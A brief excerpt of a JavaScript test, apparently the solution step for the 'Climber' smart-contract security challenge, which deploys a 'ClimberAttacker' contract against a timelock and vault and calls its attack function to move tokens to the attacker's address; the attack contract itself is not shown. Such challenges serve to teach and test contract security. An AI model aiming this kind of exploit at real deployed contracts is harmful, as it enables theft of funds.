...
describe('[Challenge] Climber', function () {
    ...
    it('Exploit', async function () {        
        ...
        const attackerContractFactory = await ethers.getContractFactory("ClimberAttacker");
        const attackerContract = await attackerContractFactory.deploy(this.timelock.address, this.vault.address);
        let tx = await attackerContract.attack(this.token.address, attacker.address);
        await tx.wait();
    });
